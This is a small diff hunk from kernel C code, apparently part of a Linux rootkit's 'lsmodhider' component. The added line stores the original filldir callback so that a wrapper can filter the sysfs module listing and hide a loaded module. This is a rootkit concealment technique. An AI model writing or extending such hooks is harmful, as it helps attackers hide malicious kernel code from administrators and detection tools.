@@ -118,6 +118,7 @@ void lsmodhider_cleanup(void)
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
 static int thor_sysmodule_iterate(struct file *file, void *dirent, filldir_t filldir)
 {
+    orig_sysmodule_filldir = filldir;
     return orig_sysmodule_iterate(file, dirent, thor_sysmodule_filldir);
 }
 #else
